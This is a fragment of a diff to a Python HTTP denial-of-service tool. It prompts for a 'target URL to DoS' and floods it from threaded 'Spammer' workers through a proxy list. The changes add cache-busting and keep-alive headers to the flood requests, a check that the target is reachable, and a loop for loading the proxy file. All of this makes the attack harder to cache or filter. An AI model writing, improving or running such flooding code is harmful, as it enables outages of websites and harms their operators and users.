@@ -14,7 +14,6 @@ import string
 import sys
 import threading
 import urllib.request
-import socket
 
 from sys import stdout
 from colorama import Fore, Style
@@ -8225,8 +8224,10 @@ ua = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.
 	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US",
 	"/4.0 ; MSIE 6.1; Windows XP",
 	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51"	        			
-	]		
+			]
 			
+
+
 class Spammer(threading.Thread):
     def __init__(self, url, number, lista):
         threading.Thread.__init__(self)
@@ -8236,6 +8237,13 @@ class Spammer(threading.Thread):
             'User-Agent': random.choice(ua),
             'Keep-Alive': random.randint(110, 9960),
             'Referer': random.choice(ref),
+            'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
+            'Accept-Encoding': 'gzip;q=0,deflate;q=0',
+            'Connection': 'Keep-Alive',
+            'Cache-Control': 'no-cache, no-store, must-revalidate',
+            'Cache-directive': 'no-cache',
+            'Pragma': 'no-cache',
+            'Upgrade-Insecure-Requests': '1',
         }
         self.Lock = threading.Lock()
         self.lista = lista
@@ -8306,9 +8314,16 @@ class MainLoop():
             print(Style.RESET_ALL)
             url = input('> Enter the target URL to DoS: ')
             url = self.check_url(url)
-
-            proxy_file = input('> Enter the path to the proxy list: ')
             try:
+                req = urllib.request.Request(url, None, {'User-Agent': random.choice(ua)})
+                response = urllib.request.urlopen(req)
+                break
+            except:
+                print('> Could not open the specified URL.')
+
+        while True:
+            try:
+                proxy_file = input('> Enter the path to the proxy list: ')
                 with open(proxy_file, 'r') as in_file:
                     proxy_list = [i.strip() for i in in_file.readlines()]
                 break
